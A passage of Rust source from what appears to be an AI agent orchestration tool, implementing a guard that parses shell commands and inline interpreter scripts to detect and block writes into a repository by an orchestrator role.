/// entirely with literals: `('echo x > f')`, `(['rm', 'f'])` or node's
/// `('cp', ['a', 'b'])`. `None` for anything built at run time.
fn shell_command_from_args(args: &str) -> Option<String> {
    let parts = split_top_level(args);
    let first = *parts.first()?;
    let list_words = |list: &str| -> Option<Vec<String>> {
        let inner = list.trim().strip_prefix('[')?.strip_suffix(']')?;
        split_top_level(inner)
            .into_iter()
            .filter(|element| !element.is_empty())
            .map(single_literal)
            .collect()
    };
    if first.starts_with('[') {
        return Some(join_shell_words(&list_words(first)?));
    }
    let literal = single_literal(first)?;
    match parts.get(1).filter(|second| second.starts_with('[')) {
        Some(list) => {
            let mut words = vec![literal];
            words.extend(list_words(list)?);
            Some(join_shell_words(&words))
        }
        None => Some(literal),
    }
}

fn is_write_mode(literal: &str) -> bool {
    literal.chars().all(|c| "rwaxbtU+".contains(c)) && literal.contains(['w', 'a', 'x', '+'])
}

/// Whether `code`'s occurrence of `pattern` at byte `index` starts a name
/// rather than the tail of a longer identifier.
fn starts_identifier(code: &str, index: usize) -> bool {
    !code[..index]
        .chars()
        .next_back()
        .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The write an inline interpreter script (`python3 -c`, `node -e`, or a
/// heredoc body fed to one) performs on the repository, if any. Each write
/// primitive's string-literal path targets are resolved like a shell
/// redirect's: outside the repository (the scratchpad) or in `.zirv/work` and
/// `.zirv/memory` is allowed, and a target that is not a literal cannot be
/// resolved and counts as a write. Shell strings handed to `os.system`,
/// `subprocess` or `child_process` are screened as shell. Approximate by
/// design (a text scan, not a parse) and biased toward flagging: a false
/// positive only costs a dispatched worker, a miss silently keeps a write.
fn inline_code_write_hit(
    code: &str,
    program: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
    depth: usize,
) -> Option<String> {
    const UNRESOLVED: &str = "<inline interpreter write>";
    let path_literals = |text: &str| -> Vec<String> {
        string_literals(text)
            .into_iter()
            .filter(|l| !l.is_empty() && !NON_PATH_LITERALS.contains(&l.as_str()))
            .collect()
    };
    let target_hit = |literals: Vec<String>| -> Option<String> {
        if literals.is_empty() {
            return Some(UNRESOLVED.to_string());
        }
        literals
            .iter()
            .find_map(|target| repo_write_violation(target, cwd, repo_root_of, env))
    };
    let receiver_of = |index: usize| {
        let start = code[..index].rfind([';', '\n']).map_or(0, |p| p + 1);
        &code[start..index]
    };
    let gated = |gate: &[&str]| gate.is_empty() || gate.iter().any(|g| code.contains(g));

    for primitive in INLINE_FS_PRIMITIVES {
        for (index, _) in code.match_indices(primitive.pattern) {
            if !gated(primitive.gate)
                || (!primitive.pattern.starts_with('.') && !starts_identifier(code, index))
            {
                continue;
            }
            let open = index + primitive.pattern.len() - 1;
            let name = primitive
                .pattern
                .trim_start_matches('.')
                .trim_end_matches('(');
            let mut literals = Vec::new();
            if primitive.receiver {
                literals.extend(path_literals(receiver_of(index)));
            }
            if primitive.args {
                let mut args = path_literals(balanced_args(code, open));
                let lowered = name.to_ascii_lowercase();
                if lowered.contains("write")
                    || lowered.starts_with("append")
                    || lowered == "file_put_contents"
                {
                    // The data written is a literal too; only the path is a target.
                    args.truncate(1);
                } else if lowered.starts_with("copy") || name.starts_with("cp") {
                    args = args.split_off(args.len().saturating_sub(1));
                }
                literals.extend(args);
            }
            if let Some(hit) = target_hit(literals) {
                return Some(hit);
            }
        }
    }
    for (prefix, gate) in INLINE_FS_PREFIXES {
        for (index, _) in code.match_indices(prefix) {
            let rest = &code[index + prefix.len()..];
            let name_len = rest
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                .unwrap_or(rest.len());
            if name_len == 0
                || !rest[name_len..].starts_with('(')
                || !starts_identifier(code, index)
                || (!gate.is_empty() && !code.contains(gate))
            {
                continue;
            }
            let open = index + prefix.len() + name_len;
            let mut literals = path_literals(balanced_args(code, open));
            if rest.starts_with("copy") {
                literals = literals.split_off(literals.len().saturating_sub(1));
            }
            if let Some(hit) = target_hit(literals) {
                return Some(hit);
            }
        }
    }
    for pattern in INLINE_OPEN_PRIMITIVES {
        for (index, _) in code.match_indices(pattern) {
            if !starts_identifier(code, index) && !code[..index].ends_with('.') {
                continue;
            }
            let args = balanced_args(code, index + pattern.len() - 1);
            if !string_literals(args).iter().any(|l| is_write_mode(l)) {
                continue;
            }
            if let Some(hit) = target_hit(path_literals(args)) {
                return Some(hit);
            }
        }
    }
    for primitive in INLINE_SHELL_PRIMITIVES {
        for (index, _) in code.match_indices(primitive.pattern) {
            if !gated(primitive.gate) || !starts_identifier(code, index) {
                continue;
            }
            let args = balanced_args(code, index + primitive.pattern.len() - 1);
            let Some(command) = shell_command_from_args(args) else {
                return Some(UNRESOLVED.to_string());
            };
            if let Some(hit) =
                orchestrator_repo_write_target_in(&command, cwd, repo_root_of, env, depth + 1)
            {
                return Some(hit);
            }
        }
    }
    // Downloads and archive extraction: the destination is the second
    // argument, or the working directory when none is given.
    for (pattern, whole_args, gate) in [
        ("urlretrieve(", false, ""),
        (".extractall(", true, ""),
        (".extract(", false, "ZipFile"),
        (".extract(", false, "tarfile"),
        (".extract(", false, "TarFile"),
    ] {
        for (index, _) in code.match_indices(pattern) {
            if !gate.is_empty() && !code.contains(gate) {
                continue;
            }
            let args = balanced_args(code, index + pattern.len() - 1);
            let parts = split_top_level(args);
            let destination = if whole_args {
                Some(args)
            } else {
                parts.get(1).copied()
            };
            let literals = match destination.filter(|d| !d.trim().is_empty()) {
                Some(destination) => path_literals(destination),
                None if pattern == "urlretrieve(" => continue,
                None => vec!["./__extracted__".to_string()],
            };
            if let Some(hit) = target_hit(literals) {
                return Some(hit);
            }
        }
    }
    if matches!(program, "perl" | "ruby") {
        return script_language_write_hit(code, program == "perl", cwd, repo_root_of, env, depth);
    }
    None
}

/// Words, backticks and `qx`/`%x` of a perl or ruby script that write files
/// or run a shell command, including the paren-less spellings
/// (`unlink "f"`, `system "rm f"`).
fn script_language_write_hit(
    code: &str,
    perl: bool,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
    depth: usize,
) -> Option<String> {
    const UNRESOLVED: &str = "<inline interpreter write>";
    const PERL_FS_WORDS: &[&str] = &[
        "unlink", "rename", "mkdir", "rmdir", "chmod", "chown", "truncate", "symlink", "link",
        "utime",
    ];
    let nested = |command: &str| {
        orchestrator_repo_write_target_in(command, cwd, repo_root_of, env, depth + 1)
    };
    let target_hit = |targets: Vec<String>| -> Option<String> {
        if targets.is_empty() {
            return Some(UNRESOLVED.to_string());
        }
        targets
            .iter()
            .find_map(|target| repo_write_violation(target, cwd, repo_root_of, env))
    };
    // The arguments of a call spelled with or without parentheses.
    let call_args = |from: usize| -> &str {
        let rest = &code[from..];
        let trimmed = rest.trim_start();
        if trimmed.starts_with('(') {
            balanced_args(code, from + (rest.len() - trimmed.len()))
        } else {
            let mut quote: Option<char> = None;
            let end = trimmed
                .char_indices()
                .find(|&(_, c)| {
                    match quote {
                        Some(active) if c == active => quote = None,
                        Some(_) => {}
                        None if matches!(c, '\'' | '"') => quote = Some(c),
                        None if matches!(c, ';' | '\n' | '}') => return true,
                        None => {}
                    }
                    false
                })
                .map_or(trimmed.len(), |(i, _)| i);
            &trimmed[..end]
        }
    };
    let command_of = |args: &str| -> Option<String> {
        let words: Vec<String> = split_top_level(args)
            .into_iter()
            .map(single_literal)
            .collect::<Option<_>>()?;
        match words.as_slice() {
            [] => None,
            [only] => Some(only.clone()),
            _ => Some(join_shell_words(&words)),
        }
    };
    let path_literals = |text: &str| -> Vec<String> {
        string_literals(text)
            .into_iter()
            .filter(|l| !l.is_empty() && !NON_PATH_LITERALS.contains(&l.as_str()))
            .collect()
    };

    // Backtick strings are shell commands.
    for (n, part) in code.split('`').enumerate() {
        if n % 2 == 1
            && let Some(hit) = nested(part)
        {
            return Some(hit);
        }
    }
    let mut words = code.char_indices().peekable();
    while let Some((start, c)) = words.next() {
        if !(c.is_ascii_alphabetic() || c == '_' || c == '%') || !starts_identifier(code, start) {
            continue;
        }
        let mut end = start + c.len_utf8();
        while let Some(&(i, n)) = words.peek() {
            if n.is_ascii_alphanumeric() || n == '_' {
                end = i + n.len_utf8();
                words.next();
            } else {
                break;
            }
        }
        let word = &code[start..end];
        let preceded_by = code[..start].trim_end().chars().next_back();
        if matches!(preceded_by, Some('.' | '$' | '@' | '&' | ':')) {
            continue;
        }
        match word {
            "qx" | "%x" => {
                let rest = code[end..].trim_start();
                let Some(open) = rest.chars().next() else {
                    continue;
                };
                let close = match open {
                    '(' => ')',
                    '{' => '}',
                    '[' => ']',
                    '<' => '>',
                    other => other,
                };
                if let Some(len) = rest[open.len_utf8()..].find(close)
                    && let Some(hit) = nested(&rest[open.len_utf8()..open.len_utf8() + len])
                {
                    return Some(hit);
                }
            }
            "system" | "exec" | "spawn" if word != "spawn" || !perl => {
                let Some(command) = command_of(call_args(end)) else {
                    return Some(UNRESOLVED.to_string());
                };
                if let Some(hit) = nested(&command) {
                    return Some(hit);
                }
            }
            "open" if perl => {
                let literals = string_literals(call_args(end));
                if literals.iter().any(|l| {
                    l.trim_start().starts_with(['>', '+']) && !l.trim_start().starts_with(">&")
                }) {
                    let targets = literals
                        .iter()
                        .map(|l| {
                            l.trim_start()
                                .trim_start_matches(['>', '+', '<', ' '])
                                .to_string()
                        })
                        .filter(|l| !l.is_empty())
                        .collect();
                    if let Some(hit) = target_hit(targets) {
                        return Some(hit);
                    }
                }
            }
            _ if perl && PERL_FS_WORDS.contains(&word) => {
                if let Some(hit) = target_hit(path_literals(call_args(end))) {
                    return Some(hit);
                }
            }
            _ => {}
        }
    }
    None
}

/// An orchestrator seat must not directly write any repository, including a
/// sibling checkout. Check redirects, editors, copy targets and patches;
/// exempt only patches immediately piped from a diff-producing git action.
/// This argv-scoped classifier cannot track `cd` or fully prove interpreter
/// path effects (#334).
pub(crate) fn orchestrator_repo_write_target(
    command: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
) -> Option<String> {
    orchestrator_repo_write_target_in(command, cwd, repo_root_of, env, 0)
}

/// [`orchestrator_repo_write_target`] for a command found `depth` levels
/// down inside a wrapper, `eval`, `xargs` or interpreter string.
fn orchestrator_repo_write_target_in(
    command: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
    depth: usize,
) -> Option<String> {
    if depth > SEAT_GUARD_DEPTH_LIMIT {
        return Some("<nested command too deep to screen>".to_string());
    }
    let (sanitized, code_bodies) = super::shell::redact_inert_heredocs(command);
    // A python/node-style heredoc body is code in that language: judge it
    // by its write primitives, never as shell redirects (`if i>5:`).
    for (interpreter, body) in &code_bodies {
        if let Some(hit) = inline_code_write_hit(body, interpreter, cwd, repo_root_of, env, depth) {
            return Some(hit);
        }
    }
    // Track only the immediately preceding diff-producing git segment;
    // reset at each other segment before considering a patch-apply exemption.
    let mut previous_diff_producing_git = false;
    // Directory relative targets resolve against; a literal top-level `cd`
    // moves it only for segments chained to it by `&&` (#883). Any other
    // separator may run the next segment without the `cd` having taken effect,
    // so the session cwd applies again. `cd` inside `( )`/`$( )` never
    // reaches here as a segment-leading `cd`, so it cannot leak.
    let session_cwd = cwd.to_string();
    let mut cwd = session_cwd.clone();
    let segments = tokenize_segments_joined(&sanitized);
    for (index, (segment, preceded_by_pipe, join)) in segments.iter().enumerate() {
        let preceded_by_pipe = *preceded_by_pipe;
        if *join != Join::And {
            cwd = session_cwd.clone();
        }
        // `$PWD`, `${PWD}`, `$(pwd)` and `` `pwd` `` are the tracked directory.
        let segment = &substitute_pwd(segment, &cwd);
        let collapsed = collapse_whitespace(segment);
        let Some(tokens) = sql_tokens(&collapsed) else {
            previous_diff_producing_git = false;
            continue;
        };
        let Some(first) = tokens.first() else {
            previous_diff_producing_git = false;
            continue;
        };
        let program = sql_program_name(first);

        // Anything but a plain leading `cd` that may change the directory
        // (group/subshell, `pushd`, `builtin cd`, ...) makes the cwd unknown.
        let may_change_dir = program.starts_with(['(', '{'])
            || (program != "cd"
                && tokens
                    .iter()
                    .any(|t| matches!(t.as_str(), "cd" | "pushd" | "popd")));
        if may_change_dir {
            cwd = session_cwd.clone();
        }

        if program == "cd" {
            previous_diff_producing_git = false;
            // A piped `cd` runs in a subshell and does not move this shell;
            // after `||` it may be skipped (`true || cd x && cmd`).
            let piped = preceded_by_pipe || segments.get(index + 1).is_some_and(|(_, p, _)| *p);
            if piped || *join == Join::Or {
                continue;
            }
            // A `cd` this guard cannot resolve literally may land anywhere.
            cwd = match tokens.as_slice() {
                [_, path] if !path.starts_with('-') => resolve_repo_write_target(path, &cwd)
                    .filter(|resolved| Path::new(resolved).is_absolute())
                    .unwrap_or_else(|| session_cwd.clone()),
                _ => session_cwd.clone(),
            };
            continue;
        }

        // Parse the actual git action past global flags so `apply`/`am` cannot
        // inherit the blanket exemption for other git commands (#334).
        if program == "git" {
            let action = git_action(&tokens).map(|(_, action)| action.to_ascii_lowercase());
            if let Some(label) = git_apply_program_label(&program, action.as_deref()) {
                let exempt = preceded_by_pipe && previous_diff_producing_git;
                previous_diff_producing_git = false;
                if exempt {
                    continue;
                }
                return Some(label.to_string());
            }
            previous_diff_producing_git = action
                .as_deref()
                .is_some_and(|action| GIT_DIFF_PRODUCING_ACTIONS.contains(&action));
            continue;
        }

        if let Some(label) = git_apply_program_label(&program, None) {
            let exempt = preceded_by_pipe && previous_diff_producing_git;
            previous_diff_producing_git = false;
            if exempt {
                continue;
            }
            return Some(label.to_string());
        }
        previous_diff_producing_git = false;

        // Script text keeps its newlines in the raw tokens; `collapsed` has none.
        let raw_tokens = sql_tokens(segment).unwrap_or_else(|| tokens.clone());
        // The command's own arguments, shell redirects (`2>&1`, `< /dev/null`) removed.
        let argv = path_command_tokens(&collapsed)
            .filter(|argv| argv.first() == tokens.first())
            .unwrap_or_else(|| tokens.clone());
        if let Some(hit) = nested_command_write_hit(
            &program,
            &collapsed,
            &argv,
            &raw_tokens,
            &cwd,
            repo_root_of,
            env,
            depth,
        ) {
            return Some(hit);
        }

        if let Some(targets) = segment_write_targets(&neutralize_heredoc_operator(segment)) {
            for target in &targets {
                if let Some(hit) = repo_write_violation(target, &cwd, repo_root_of, env) {
                    return Some(hit);
                }
            }
        }

        if matches!(program.as_str(), "sed" | "perl" | "ruby")
            && argv[1..].iter().any(|t| is_sed_perl_inplace_flag(t))
        {
            for target in sed_perl_inplace_targets(&program, &argv) {
                if let Some(hit) = repo_write_violation(&target, &cwd, repo_root_of, env) {
                    return Some(hit);
                }
            }
        }

        if matches!(program.as_str(), "cp" | "mv" | "install" | "rsync" | "ln")
            && let Some(target) = last_non_flag_argument(&argv)
            && let Some(hit) = repo_write_violation(target, &cwd, repo_root_of, env)
        {
            return Some(hit);
        }

        for target in output_file_targets(&program, &argv) {
            if let Some(hit) = repo_write_violation(&target, &cwd, repo_root_of, env) {
                return Some(hit);
            }
        }

        if matches!(
            program.as_str(),
            "python" | "python3" | "node" | "ruby" | "perl" | "php"
        ) && let Some(code) = inline_interpreter_code(&raw_tokens)
            && let Some(hit) = inline_code_write_hit(code, &program, &cwd, repo_root_of, env, depth)
        {
            return Some(hit);
        }
    }
    None
}

/// Replace `$PWD`, `${PWD}`, `$(pwd)` and `` `pwd` `` in `segment` with `cwd`
/// (single-quoted when bare, raw inside double quotes, untouched inside single
/// quotes), so a target spelled through them is judged by where it lands.
fn substitute_pwd(segment: &str, cwd: &str) -> String {
    if !segment.contains(['$', '`']) || cwd.contains(['\'', '"', '$', '`', '\\']) {
        return segment.to_string();
    }
    let mut out = String::with_capacity(segment.len());
    let mut quote: Option<char> = None;
    let mut rest = segment;
    while let Some(c) = rest.chars().next() {
        if quote == Some('\'') {
            if c == '\'' {
                quote = None;
            }
        } else if c == '\'' && quote.is_none() {
            quote = Some('\'');
        } else if c == '"' {
            quote = if quote.is_some() { None } else { Some('"') };
        } else if let Some(spelling) = ["${PWD}", "$(pwd)", "`pwd`", "$PWD"]
            .iter()
            .find(|spelling| rest.starts_with(**spelling))
            && !(*spelling == "$PWD"
                && rest[4..]
                    .chars()
                    .next()
                    .is_some_and(|n| n.is_ascii_alphanumeric() || n == '_'))
        {
            if quote.is_some() {
                out.push_str(cwd);
            } else {
                out.push('\'');
                out.push_str(cwd);
                out.push('\'');
            }
            rest = &rest[spelling.len()..];
            continue;
        }
        out.push(c);
        rest = &rest[c.len_utf8()..];
    }
    out
}

/// Commands whose real work is another command or script: shell `-c`
/// payloads, `env`/launcher prefixes, `eval`, `xargs`, `awk`, and `sed`'s
/// `w` commands. Each is screened as the command it runs; whatever it
/// would write through an argument that stdin or a script supplies and this
/// guard cannot resolve counts as a write.
#[allow(clippy::too_many_arguments)]
fn nested_command_write_hit(
    program: &str,
    collapsed: &str,
    tokens: &[String],
    raw_tokens: &[String],
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
    depth: usize,
) -> Option<String> {
    let nested = |command: &str| {
        orchestrator_repo_write_target_in(command, cwd, repo_root_of, env, depth + 1)
    };
    let target_hit = |target: &str| repo_write_violation(target, cwd, repo_root_of, env);
    // `xargs` is also a launcher prefix, but its stdin-supplied arguments
    // need their own screen.
    if program == "xargs" {
        return xargs_write_hit(&tokens[1..], &nested);
    }
    if let Some(inner) = super::shell::unwrap_shell_wrapper(collapsed)
        .or_else(|| super::shell::unwrap_env_prefix(collapsed))
        .or_else(|| super::shell::unwrap_launcher_prefix(collapsed))
    {
        return nested(&inner);
    }
    match program {
        "eval" => nested(&tokens[1..].join(" ")),
        "awk" | "gawk" | "mawk" | "nawk" => {
            let mut operands = Vec::new();
            let mut program_text = None;
            let mut inplace = false;
            let mut words = raw_tokens[1..].iter();
            while let Some(word) = words.next() {
                match word.as_str() {
                    "-f" | "--file" => return None,
                    "-F" | "-v" | "-e" | "--source" => {
                        words.next();
                    }
                    "-i" => inplace |= words.next().is_some_and(|v| v == "inplace"),
                    _ if word.starts_with("-iinplace") => inplace = true,
                    _ if word.starts_with('-') && program_text.is_none() => {}
                    _ if program_text.is_none() => program_text = Some(word.as_str()),
                    _ => operands.push(word.as_str()),
                }
            }
            if inplace && let Some(hit) = operands.iter().find_map(|t| target_hit(t)) {
                return Some(hit);
            }
            for effect in awk_program_effects(program_text?) {
                let hit = match effect {
                    AwkEffect::Target(target) => target_hit(&target),
                    AwkEffect::Command(command) => nested(&command),
                    AwkEffect::Unresolved => Some("<awk write>".to_string()),
                };
                if hit.is_some() {
                    return hit;
                }
            }
            None
        }
        "sed" => {
            let mut scripts = Vec::new();
            let mut words = raw_tokens[1..].iter().peekable();
            let mut explicit = false;
            while let Some(word) = words.next() {
                let cluster_e = word.starts_with('-')
                    && !word.starts_with("--")
                    && word.len() > 1
                    && word.ends_with('e')
                    && word.chars().skip(1).all(|c| c.is_ascii_alphabetic());
                if word == "-e" || word == "--expression" || cluster_e {
                    explicit = true;
                    scripts.extend(words.next().cloned());
                } else if let Some(script) = word.strip_prefix("--expression=") {
                    explicit = true;
                    scripts.push(script.to_string());
                } else if word == "-f" || word == "--file" || word == "-l" {
                    explicit |= word != "-l";
                    words.next();
                } else if !explicit && !word.starts_with('-') {
                    scripts.push(word.clone());
                    explicit = true;
                }
            }
            scripts
                .iter()
                .flat_map(|script| sed_write_files(script))
                .find_map(|file| target_hit(&file))
        }
        _ => None,
    }
}

/// `xargs`' own options skipped, the command it runs is screened; one that
/// writes through arguments read from stdin has no resolvable target unless a
/// `-I`/`-J` placeholder pins where they land.
fn xargs_write_hit(args: &[String], nested: &dyn Fn(&str) -> Option<String>) -> Option<String> {
    let mut placeholder = false;
    let mut i = 0;
    while i < args.len() && args[i].starts_with('-') {
        let flag = args[i].as_str();
        if flag == "--" {
            i += 1;
            break;
        }
        match flag {
            "-I" | "-J" | "-L" | "-n" | "-P" | "-s" | "-d" | "-E" | "-a" => {
                placeholder |= matches!(flag, "-I" | "-J");
                i += 1;
            }
            _ => placeholder |= flag.starts_with("-I") || flag.starts_with("-J") || flag == "-i",
        }
        i += 1;
    }
    let command = args.get(i..).unwrap_or_default();
    let program = sql_program_name(command.first()?);
    if let Some(hit) = nested(&join_shell_words(command)) {
        return Some(hit);
    }
    let inplace = command.iter().any(|t| is_sed_perl_inplace_flag(t));
    let stdin_target = matches!(
        program.as_str(),
        "rm" | "touch"
            | "mkdir"
            | "truncate"
            | "tee"
            | "chmod"
            | "chown"
            | "rmdir"
            | "unlink"
            | "mv"
            | "cp"
            | "install"
            | "ln"
            | "rsync"
    ) || (matches!(program.as_str(), "sed" | "perl") && inplace);
    (stdin_target && !placeholder).then(|| "<xargs write>".to_string())
}

/// What an awk program does outside plain output.
enum AwkEffect {
    /// `print > "file"` / `>> "file"` with a literal path.
    Target(String),
    /// `print | "cmd"` or `system("cmd")` with a literal command.
    Command(String),
    /// A redirect, pipe or `system` whose destination is computed.
    Unresolved,
}

/// The file and command effects of awk program text.
fn awk_program_effects(program: &str) -> Vec<AwkEffect> {
    let chars: Vec<char> = program.chars().collect();
    let mut effects = Vec::new();
    let starts = |i: usize, word: &str| {
        chars[i..].iter().take(word.len()).collect::<String>() == word
            && (i == 0 || !(chars[i - 1].is_ascii_alphanumeric() || chars[i - 1] == '_'))
    };
    let skip_string = |mut i: usize| {
        i += 1;
        while i < chars.len() && chars[i] != '"' {
            i += usize::from(chars[i] == '\\') + 1;
        }
        i + 1
    };
    let classify = |text: &str, literal: fn(String) -> AwkEffect| {
        single_literal(text).map_or(AwkEffect::Unresolved, literal)
    };
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '"' {
            i = skip_string(i);
        } else if starts(i, "print") {
            let mut depth = 0i32;
            let mut k = i + if starts(i, "printf") { 6 } else { 5 };
            while k < chars.len() {
                match chars[k] {
                    '"' => {
                        k = skip_string(k);
                        continue;
                    }
                    '(' | '[' => depth += 1,
                    ')' | ']' => depth -= 1,
                    ';' | '\n' | '}' if depth <= 0 => break,
                    '>' | '|'
                        if depth == 0
                            && !matches!(chars.get(k + 1), Some('|' | '='))
                            && !(chars[k] == '|' && chars[k - 1] == '|') =>
                    {
                        let pipe = chars[k] == '|';
                        let mut e = k + 1 + usize::from(chars.get(k + 1) == Some(&'>'));
                        let begin = e;
                        while e < chars.len() && !matches!(chars[e], ';' | '\n' | '}') {
                            e += if chars[e] == '"' {
                                skip_string(e) - e
                            } else {
                                1
                            };
                        }
                        let text: String = chars[begin..e.min(chars.len())].iter().collect();
                        effects.push(if pipe {
                            classify(&text, AwkEffect::Command)
                        } else {
                            classify(&text, AwkEffect::Target)
                        });
                        k = e;
                        break;
                    }
                    _ => {}
                }
                k += 1;
            }
            i = k;
        } else if starts(i, "system") && chars.get(i + 6) == Some(&'(') {
            let args = balanced_args(
                program,
                program.char_indices().nth(i + 6).map_or(0, |p| p.0),
            );
            effects.push(classify(args, AwkEffect::Command));
            i += 7;
        } else {
            i += 1;
        }
    }
    effects
}

/// The values of one option: `-x V`, `-xV`, a cluster ending in it (`-sSLo V`,
/// every letter before it from `before`), `--long V` and `--long=V`.
fn option_values(argv: &[String], short: char, before: &str, longs: &[&str]) -> Vec<String> {
    let mut values = Vec::new();
    let mut i = 1;
    while i < argv.len() {
        let token = argv[i].as_str();
        if let Some(long) = longs
            .iter()
            .find(|long| token == **long || token.starts_with(&format!("{long}=")))
        {
            match token.strip_prefix(&format!("{long}=")) {
                Some(value) => values.push(value.to_string()),
                None => {
                    if let Some(next) = argv.get(i + 1) {
                        values.push(next.clone());
                        i += 1;
                    }
                }
            }
        } else if token.starts_with('-')
            && !token.starts_with("--")
            && let Some(position) = token[1..].find(short)
            && token[1..1 + position].chars().all(|c| before.contains(c))
        {
            let rest = &token[1 + position + short.len_utf8()..];
            if rest.is_empty() {
                if let Some(next) = argv.get(i + 1) {
                    values.push(next.clone());
                    i += 1;
                }
            } else {
                values.push(rest.to_string());
            }
        }
        i += 1;
    }
    values
}

/// Whether `argv` has a bare-letter cluster (or a long option) selecting `letter`.
fn has_flag(argv: &[String], letters: &str, longs: &[&str]) -> bool {
    argv[1..].iter().any(|token| {
        longs.contains(&token.as_str())
            || (token.starts_with('-')
                && !token.starts_with("--")
                && token.len() > 1
                && token[1..].chars().all(|c| c.is_ascii_alphabetic())
                && token[1..].contains(|c| letters.contains(c)))
    })
}

/// Files a command writes through an output option (`sort -o`, `curl -o`,
/// `wget -O`) or by unpacking (`tar x`, `unzip`) or downloading into the
/// working directory. A directory target is named by a file inside it, so
/// the repository lookup starts in that directory.
pub(super) fn output_file_targets(program: &str, argv: &[String]) -> Vec<String> {
    let in_dir = |dir: &str| format!("{}/__zirv_out__", dir.trim_end_matches('/'));
    let not_stdout = |value: &String| value != "-" && !value.is_empty();
    match program {
        "sort" => option_values(argv, 'o', "rnubdfghiMRsVzc", &["--output"]),
        "curl" => {
            let output_dir = option_values(argv, '\0', "", &["--output-dir"]);
            // A relative target lands under --output-dir.
            let under_dir = |target: String| match output_dir.first() {
                Some(dir)
                    if !target.starts_with(['/', '~', '$']) && target.get(1..2) != Some(":") =>
                {
                    format!("{}/{target}", dir.trim_end_matches('/'))
                }
                _ => target,
            };
            let mut targets: Vec<String> = option_values(argv, 'o', "sSLkfgGiIvNq", &["--output"])
                .into_iter()
                .chain(option_values(argv, 'D', "sSLkfgGiIvNq", &["--dump-header"]))
                .chain(option_values(argv, 'c', "sSLkfgGiIvNq", &["--cookie-jar"]))
                .filter(not_stdout)
                .map(under_dir)
                .collect();
            targets.extend(
                option_values(
                    argv,
                    '\0',
                    "",
                    &[
                        "--trace",
                        "--trace-ascii",
                        "--stderr",
                        "--libcurl",
                        "--etag-save",
                        "--hsts",
                        "--alt-svc",
                    ],
                )
                .into_iter()
                .filter(not_stdout),
            );
            let remote_name = argv[1..].iter().any(|t| {
                matches!(t.as_str(), "--remote-name" | "--remote-name-all")
                    || (t.starts_with('-')
                        && !t.starts_with("--")
                        && t.len() > 1
                        && t[1..].chars().all(|c| "sSLkfgGiIvNqO".contains(c))
                        && t.contains('O'))
            });
            if remote_name {
                let dir = option_values(argv, '\0', "", &["--output-dir"]);
                targets.push(in_dir(dir.first().map_or(".", String::as_str)));
            }
            targets
        }
        "wget" => {
            if has_flag(argv, "", &["--spider"]) {
                return Vec::new();
            }
            let mut targets: Vec<String> = option_values(argv, 'o', "qvcnk", &["--output-file"])
                .into_iter()
                .chain(option_values(argv, 'a', "qvcnk", &["--append-output"]))
                .chain(option_values(
                    argv,
                    '\0',
                    "",
                    &["--save-cookies", "--warc-file"],
                ))
                .filter(not_stdout)
                .collect();
            let documents = option_values(argv, 'O', "qvcnk", &["--output-document"]);
            if documents.is_empty() {
                let dir = option_values(argv, 'P', "qvcnk", &["--directory-prefix"]);
                targets.push(in_dir(dir.first().map_or(".", String::as_str)));
            }
            targets.extend(documents.into_iter().filter(not_stdout));
            targets
        }
        "tar" => {
            let mut argv = argv.to_vec();
            if argv.get(1).is_some_and(|t| {
                !t.starts_with('-') && !t.is_empty() && t.chars().all(|c| c.is_ascii_alphabetic())
            }) {
                argv[1].insert(0, '-');
            }
            let extract = has_flag(&argv, "x", &["--extract", "--get"]);
            let create = has_flag(&argv, "cru", &["--create", "--append", "--update"]);
            if has_flag(&argv, "O", &["--to-stdout"]) {
                return Vec::new();
            }
            let letters = "xzjJvpkmohPSUcrutf";
            if extract {
                let dirs = option_values(&argv, 'C', letters, &["--directory"]);
                return if dirs.is_empty() {
                    vec![in_dir(".")]
                } else {
                    dirs.iter().map(|dir| in_dir(dir)).collect()
                };
            }
            if create {
                return option_values(&argv, 'f', letters, &["--file"])
                    .into_iter()
                    .filter(not_stdout)
                    .collect();
            }
            Vec::new()
        }
        "unzip" => {
            if has_flag(argv, "lptvZ", &[]) {
                return Vec::new();
            }
            let dirs = option_values(argv, 'd', "oqnjCLUaf", &[]);
            if dirs.is_empty() {
                vec![in_dir(".")]
            } else {
                dirs.iter().map(|dir| in_dir(dir)).collect()
            }
        }
        _ => Vec::new(),
    }
}

/// The files a sed script writes through `w`/`W` commands and the `w` flag of
/// `s`.
fn sed_write_files(script: &str) -> Vec<String> {
    let chars: Vec<char> = script.chars().collect();
    let mut files = Vec::new();
    let rest_of_line = |from: usize| {
        let end = chars[from..]
            .iter()
            .position(|&c| c == '\n')
            .map_or(chars.len(), |p| from + p);
        (
            chars[from..end]
                .iter()
                .collect::<String>()
                .trim()
                .to_string(),
            end,
        )
    };
    // The index after the next unescaped `delim`.
    let skip_part = |from: usize, delim: char| {
        let mut i = from;
        while i < chars.len() && chars[i] != delim {
            i += usize::from(chars[i] == '\\') + 1;
        }
        i + 1
    };
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            c if c.is_whitespace()
                || matches!(c, ';' | '{' | '}' | '!' | ',' | '$' | '~' | '+')
                || c.is_ascii_digit() =>
            {
                i += 1;
            }
            '/' => i = skip_part(i + 1, '/'),
            '\\' if i + 1 < chars.len() => i = skip_part(i + 2, chars[i + 1]),
            's' | 'y' if i + 1 < chars.len() => {
                let is_s = chars[i] == 's';
                let delim = chars[i + 1];
                i = skip_part(skip_part(i + 2, delim), delim);
                while i < chars.len() && !matches!(chars[i], ';' | '\n' | '}') {
                    if is_s && chars[i] == 'w' {
                        let (file, end) = rest_of_line(i + 1);
                        files.push(file);
                        i = end;
                        break;
                    }
                    i += 1;
                }
            }
            'w' | 'W' => {
                let (file, end) = rest_of_line(i + 1);
                files.push(file);
                i = end;
            }
            'a' | 'i' | 'c' | 'r' | 'R' | ':' | 'b' | 't' | 'T' => {
                i = rest_of_line(i + 1).1;
            }
            _ => i += 1,
        }
    }
    files.retain(|file| !file.is_empty());
    files
}

